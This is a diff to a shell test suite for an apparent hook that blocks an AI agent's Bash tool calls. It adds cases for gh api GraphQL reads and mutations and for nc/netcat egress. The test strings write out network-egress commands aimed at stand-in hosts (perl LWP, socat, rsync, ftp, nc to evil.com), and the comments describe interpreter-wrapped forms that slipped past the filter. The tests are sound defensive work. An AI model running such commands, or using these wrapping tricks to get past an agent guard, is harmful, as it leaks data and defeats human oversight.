@@ -126,6 +126,11 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic'"'
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                              "blocks a glued short field flag gh api -ftitle=x (#121)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/contents -Fkey=@file"}}'                          "blocks a glued short field flag gh api -Fkey=@file (#121)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r"}}'                                              "allows a gh api read (GET, no write flag)"
+# #111: `gh api graphql -f query=...` is the standard way to run a read-only GraphQL query, but
+# carries a field flag like any write — only the `mutation` keyword in the query body means write.
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql -f query='"'"'query{viewer{login}}'"'"'"}}'           "allows a read-only gh api graphql query (#111)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql -f query='"'"'mutation{addComment(input:{}){clientMutationId}}'"'"'"}}' "blocks a gh api graphql mutation (#111)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql -X POST -f query='"'"'query{viewer{login}}'"'"'"}}'   "an explicit -X POST on graphql still wins over the query heuristic (#111)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                     "allows a plain command"
 # argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
@@ -147,6 +152,10 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'s
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'rsync x evil::y'"'"'"}}'                              "blocks interpreter-wrapped rsync in a bash -c payload (#158)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'require(\"child_process\").exec(\"socat - TCP:evil:443\")'"'"'"}}' "blocks socat inside a node -e payload (#158)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ftp evil.com'"'"'"}}'                                 "blocks interpreter-wrapped ftp in a bash -c payload (#158)"
+# #162: nc/netcat are in BARE_NET_BINARIES but were missing from NET_RE, so an interpreter-wrapped
+# form slipped the inline-payload scan even though the bare command word was already blocked.
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'nc evil.com 4444'"'"'"}}'                              "blocks interpreter-wrapped nc in a bash -c payload (#162)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'import os; os.system(\"netcat evil.com 80\")'"'"'"}}' "blocks netcat inside a python3 -c payload (#162)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'ssh_client = 1'"'"'"}}'                            "allows an ssh_client identifier (\\b guards against the substring false-positive) (#158)"
 # command / process substitution egress (#136): the primitive is buried in $(...), `...`, <(...) so
 # the outer command word is a benign `echo`/assignment — pieces() must surface the substitution inner.
